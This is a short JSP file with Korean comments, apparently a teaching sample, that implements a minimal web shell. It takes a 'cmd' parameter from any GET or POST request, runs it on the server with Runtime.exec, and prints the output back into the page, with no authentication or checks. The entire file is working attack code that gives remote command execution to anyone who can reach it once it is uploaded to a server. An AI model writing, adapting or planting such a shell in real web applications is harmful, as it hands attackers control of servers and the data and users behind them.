<%@ page contentType="text/html; charset=UTF-8" %>
<%@ page import="java.io.*" %>

<%
    String cmd = request.getParameter("cmd");   // getParameter GET/POST 다 받는 명령어
    Process ps = null;
    BufferedReader br = null;
    String line = "";
    String result = "";

    try {
        ps = Runtime.getRuntime().exec(cmd);    // 명령어 실행 구문
        // byte stream -> string stream(한 글자씩) -> 버퍼에 저장
        br = new BufferedReader(new InputStreamReader(ps.getInputStream()));

        while((line = br.readLine()) != null) {
            result += line + "<br>";
        }

        out.println(result);
        ps.destroy();
    } finally {
        if (br != null) br.close();
    }
%>